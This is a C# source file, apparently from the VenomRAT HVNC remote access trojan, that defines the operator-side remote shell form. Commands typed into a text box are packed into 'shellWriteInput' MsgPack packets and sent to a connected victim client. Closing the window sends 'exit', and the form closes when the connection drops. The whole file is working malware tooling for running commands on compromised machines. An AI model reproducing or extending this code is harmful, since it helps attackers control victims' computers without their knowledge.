using System;
using System.Threading;
using System.Windows.Forms;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Forms
{
    public partial class FormShell : Form
    {
        public Form1 F { get; set; }

        internal Clients Client { get; set; }

        public FormShell()
        {
            this.InitializeComponent();
        }

        private void TextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (this.Client != null && e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.textBox1.Text))
            {
                if (this.textBox1.Text == "cls".ToLower())
                {
                    this.richTextBox1.Clear();
                    this.textBox1.Clear();
                }
                if (this.textBox1.Text == "exit".ToLower())
                {
                    base.Close();
                }
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
                msgPack.ForcePathObject("WriteInput").AsString = this.textBox1.Text;
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                this.textBox1.Clear();
            }
        }

        private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
            msgPack.ForcePathObject("WriteInput").AsString = "exit";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.Client.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
                base.Close();
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
        }
    }
}
